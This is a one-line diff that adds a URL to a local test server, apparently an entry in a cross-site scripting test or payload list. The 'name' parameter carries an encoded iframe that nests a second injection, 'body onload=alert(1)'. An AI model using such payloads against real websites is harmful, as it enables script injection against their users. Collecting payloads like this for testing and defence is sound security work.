@@ -1,0 +1,1 @@
+http://localhost:8888/?name=%3Ciframe%20src=%22http://localhost:8888?name=%3Cbody%20onload=alert(1);%3E%22
